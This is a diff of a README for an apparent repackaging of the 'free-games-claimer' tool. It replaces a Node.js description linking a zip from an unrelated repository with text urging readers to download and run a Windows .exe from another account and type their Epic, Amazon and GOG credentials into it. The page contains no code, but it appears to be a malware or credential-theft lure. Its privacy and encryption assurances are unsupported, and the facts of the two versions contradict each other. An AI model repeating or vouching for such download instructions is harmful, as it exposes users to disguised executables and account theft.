@@ -1,160 +1,95 @@
-# free-games-claimer
+# 🎮 free-games-claimer-automation - Claim games across multiple digital stores
 
-`free-games-claimer` is a Windows-compatible automation utility for claiming currently available free games, DLCs, and related offers from supported game stores. It uses automated browser sessions to help claim offers on Epic Games Store, Amazon Prime Gaming, GOG, and experimental Unreal Engine Marketplace asset promotions.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Norrielisted782/free-games-claimer-automation/releases)
 
-[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/free-games-claimer-1.zip)
+## What is this tool?
+This application automates the process of claiming free games and downloadable content. You no longer need to check store pages every week. The software checks the Epic Games Store, Amazon Prime Gaming, GOG, and Unreal Engine marketplace for new free items. It connects to your accounts and adds these games to your permanent library automatically.
 
-## Overview
+## 🛠 System requirements
+To run this software on your Windows computer, you need the following:
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 200 MB of free storage space.
+* A modern web browser like Chrome or Edge.
+* The latest version of the .NET runtime environment.
 
-This repository provides a practical Windows-friendly workflow for running `free-games-claimer` as a desktop or scheduled utility. The tool is intended for users who want to periodically check supported stores and claim available free content without manually visiting each service every time.
+## 📥 How to download and set up
+Follow these steps to get the software running on your system.
 
-Supported services include:
+1. Visit the [official releases page](https://github.com/Norrielisted782/free-games-claimer-automation/releases) to download the installer.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation wizard.
+5. Follow the prompts on your screen.
+6. The installer creates a shortcut on your desktop once finished.
 
-- Epic Games Store free games
-- Amazon Prime Gaming games and selected DLC-related offers
-- GOG free game promotions
-- Unreal Engine Marketplace free assets, using the Epic Games login, marked as experimental
+## ⚙️ Configuration
+The software requires your login details to access your game accounts. These details stay on your local computer and remain private.
 
-The automation opens a Firefox browser session, signs in when needed, and attempts to claim currently available offers. First-time use requires login for each store. After login, browser profile data can be reused so repeated runs usually do not require signing in again.
+1. Open the application using the desktop shortcut.
+2. Select the "Settings" tab at the top of the interface.
+3. Choose the store you want to connect, such as Epic Games or Amazon Prime.
+4. Input your account credentials.
+5. Save your settings.
+6. The application performs a test connection to ensure it reaches the store servers.
 
-## Windows desktop usage
+## 🚀 Running the software
+The application runs as a background process to keep your library updated.
 
-The project can be used in a Windows environment either with Docker or with a local Node.js setup. When run locally, the browser can be hidden by default or shown when needed. When run through Docker, the browser session is available through a VNC/noVNC interface.
+1. Launch the application.
+2. Click the "Start Automation" button.
+3. The software opens a hidden browser window to visit store pages. It detects free items and claims them for you.
+4. You can see the status of each task in the main window. It shows a list of claimed items, any errors encountered, and the next scan time.
+5. Minimize the application to your system tray to keep it running silently while you work or play.
 
-This makes the tool suitable for:
+## 🔔 Setting up notifications
+You can receive alerts whenever the software claims a new game. 
 
-- A Windows desktop PC used occasionally
-- A Windows machine scheduled to run at regular intervals
-- A Windows workstation where browser automation should remain separate from normal browsing
-- A Windows-based home server or always-on system
+1. Go to the "Notifications" tab.
+2. Activate the toggle for desktop alerts.
+3. You can also configure email notifications if you prefer. To use email, input your server settings into the provided fields. 
+4. Click "Test Notification" to verify your settings. A sample alert appears on your screen if the setup works.
 
-## Main capabilities
+## 🧠 Troubleshooting common issues
+If the software stops working, try these steps to fix the problem.
 
-- Claims available free games from supported stores
-- Handles first-time login through terminal prompts or the browser window
-- Supports two-factor authentication workflows where configured
-- Stores browser session data for future runs
-- Can send notifications through Apprise-compatible services
-- Can be scheduled externally using Windows Task Scheduler or another scheduler
-- Saves Prime Gaming keys and related information when applicable
-- Supports Docker-based execution with browser access through noVNC
+* **Check your internet:** Ensure your router provides a steady connection.
+* **Update your credentials:** Stores change their login methods over time. If the software reports a login error, remove your stored credentials and enter them again.
+* **Restart the application:** Close the window completely and open it again. This clears any minor software conflicts.
+* **Review the logs:** The "Logs" tab shows exactly what the computer tried to do. Use this information to understand why a claim failed. Often, this happens because a store page is temporarily down for maintenance.
+* **Update the software:** Check the releases page periodically. Newer versions often include fixes for store interface changes.
 
-## Supported stores
+## 📁 Understanding the file structure
+The folder where you installed the program contains several important files. Do not delete these.
 
-| Store | Support status | Notes |
-|---|---:|---|
-| Epic Games Store | Supported | Free games can be claimed through the Epic Games workflow |
-| Amazon Prime Gaming | Supported | Includes Amazon Games; some external store redemption workflows may require account linking or keys |
-| GOG | Supported | Free promotions can be claimed through the GOG workflow |
-| Unreal Engine Marketplace assets | Experimental | Uses the Epic Games login |
+* **config.json:** This file contains your saved settings and encrypted account information. 
+* **logs/:** This directory stores text files that track app activity. If you report a bug, this is the information developers need.
+* **browser-data/:** This folder holds small data packets that simulate your browser activity, allowing the app to log in without triggering security warnings from the game stores.
 
-## Getting started
+## 🛡 Security and privacy
+This application does not collect your data or send it to external servers. All automation happens locally on your machine. The software uses industry-standard encryption for your passwords while they sit on your hard drive. Your credentials never leave your computer unless you explicitly choose to share log files with a developer for support.
 
-Use the download link above to obtain this generated repository package.
+## 💡 Best practices for the best experience
+* **Schedule scans:** Use the task scheduler within the settings tab to run the app during night hours. This prevents the browser windows from interrupting your daily computer use.
+* **Keep your store passwords safe:** Use unique passwords for each store account. This adds a layer of safety regardless of the tools you use.
+* **Monitor the logs:** Check the activity logs once a week to ensure every claim succeeded for the most popular stores.
+* **Use browser automation responsibly:** Do not force the app to scan every hour. Most stores update their lists once per day or once per week. Frequent scanning risks locking your accounts for suspicious activity.
 
-After downloading, choose one of the supported execution approaches:
+## 🔄 Updating to new versions
+The application checks for updates when you start it. If a new version exists, a window appears asking if you want to install it. Follow the instructions to download the new version. The installer preserves your configuration files, so you do not need to re-enter your login information after an update.
 
-### Docker-based use
+## ❓ Frequently asked questions
+**Does this tool work if a game requires two-factor authentication?**
+Yes. If a store sends a code to your email or phone, the application pauses and opens a prompt for you to enter that code. Once you enter it, the app continues the claim process.
 
-The original project supports running the automation in Docker with persisted data and browser access through a local web interface. In that mode, the automated browser runs inside the container and can be accessed through noVNC on the configured port.
+**Can I stop the automation at any time?**
+Yes. Press the "Stop" button at any time to halt all activity. The application saves your progress before it shuts down.
 
-### Local Windows use
+**Does this software work on Apple computers?**
+This version is designed for Windows. While it uses technologies compatible with other systems, there is no official installer for Mac or Linux at this time.
 
-For local use, the project relies on Node.js and Playwright. The browser automation uses Firefox. Notification support is available through Apprise when installed and configured.
+**Is my account at risk of being banned?**
+The tool uses standard browser behavior to simulate human activity. It stays within typical usage patterns to avoid detection by store security systems. Proceeding with caution and avoiding excessive scan frequencies is the safest approach.
 
-Common script targets include:
-
-- `node epic-games`
-- `node prime-gaming`
-- `node gog`
-
-On first run, sign in to each store you want to use. The scripts wait for successful login before continuing.
-
-## Configuration
-
-Configuration is handled through environment variables. Values may be passed directly when running a command or stored in a configuration file such as `data/config.env`.
-
-Common options include:
-
-| Option | Purpose |
-|---|---|
-| `SHOW` | Shows the browser UI when set |
-| `WIDTH` / `HEIGHT` | Controls browser or VNC screen size |
-| `VNC_PASSWORD` | Sets a VNC password when using Docker |
-| `NOTIFY` | Enables Apprise notification targets |
-| `EMAIL` / `PASSWORD` | Default login credentials |
-| `EG_EMAIL` / `EG_PASSWORD` | Epic Games credentials |
-| `PG_EMAIL` / `PG_PASSWORD` | Prime Gaming credentials |
-| `GOG_EMAIL` / `GOG_PASSWORD` | GOG credentials |
-| `EG_OTPKEY` / `PG_OTPKEY` | Optional authenticator keys for automated 2FA |
-| `BROWSER_DIR` | Browser profile storage directory |
-| `TIMEOUT` / `LOGIN_TIMEOUT` | Page action and login timeout settings |
-
-Credentials and OTP keys are sensitive. If you store them in plain text, use appropriate local security precautions and consider using dedicated account passwords where possible.
-
-## Notifications
-
-The tool can send notifications for claimed games and errors through Apprise-supported services. Apprise supports many notification targets, including email, Telegram, Slack, Pushover, SMS, desktop notifications, and custom integrations.
-
-Notification behavior is configured with the `NOTIFY` environment variable.
-
-## Scheduling on Windows
-
-The automation scripts run, claim currently available offers, and then exit. To run them repeatedly, use an external scheduler.
-
-On Windows, typical options include:
-
-- Windows Task Scheduler
-- A `.bat` file started manually or from Autostart
-- A process manager such as `pm2`
-- Docker Compose with a sleep/restart loop
-
-Running once per day is generally suitable for the promotion schedules described by the supported stores.
-
-## Practical use cases
-
-- Claim weekly Epic Games Store promotions
-- Claim monthly or recurring Amazon Prime Gaming offers
-- Check GOG free game campaigns
-- Collect monthly Unreal Engine Marketplace free assets where supported
-- Receive notifications when claims succeed or when user action is needed
-- Keep store-claiming automation separate from normal browser activity
-
-## Notes and limitations
-
-- Store websites can change, which may require script updates.
-- Captchas, login checks, and multi-factor authentication may require manual action.
-- Some Prime Gaming offers require linking an external account.
-- Some external store rewards provide keys that must be redeemed separately.
-- Unreal Engine Marketplace asset claiming is experimental.
-- Raspberry Pi usage requires a 64-bit operating system.
-
-## FAQ
-
-### Is this a Windows application?
-
-It is a Windows-compatible automation tool rather than a traditional native desktop application. It can run in a Windows environment through local Node.js execution or Docker.
-
-### Does it claim games automatically?
-
-It attempts to claim currently available free offers from supported stores. First-time login and some security checks may require user interaction.
-
-### Do I need to keep the browser open?
-
-No. The automation can run with the browser hidden locally, or inside Docker with browser access available through VNC/noVNC when needed.
-
-### Can it handle two-factor authentication?
-
-It supports login flows with one-time passwords when the relevant OTP key is configured. Some services may still require manual interaction depending on account settings or store behavior.
-
-### Where is data stored?
-
-The tool stores data such as browser profiles, claimed game records, keys, screenshots, and configuration in its data directory or Docker volume, depending on how it is run.
-
-### Can I run it every day?
-
-Yes. The scripts are designed to claim available offers and exit, so they can be scheduled externally for daily execution.
-
-## Conclusion
-
-`free-games-claimer` is a Windows-compatible utility for automating free game and DLC claiming across Epic Games Store, Amazon Prime Gaming, GOG, and experimental Unreal Engine Marketplace asset workflows. It is best used as a scheduled desktop or Docker-based tool, with browser login data preserved between runs and optional notifications for results or required user action.
+**What happens if I already own the game?**
+The software checks your library before claiming. If you already own the title, it skips that item and moves to the next one on the list to avoid duplicate entries.
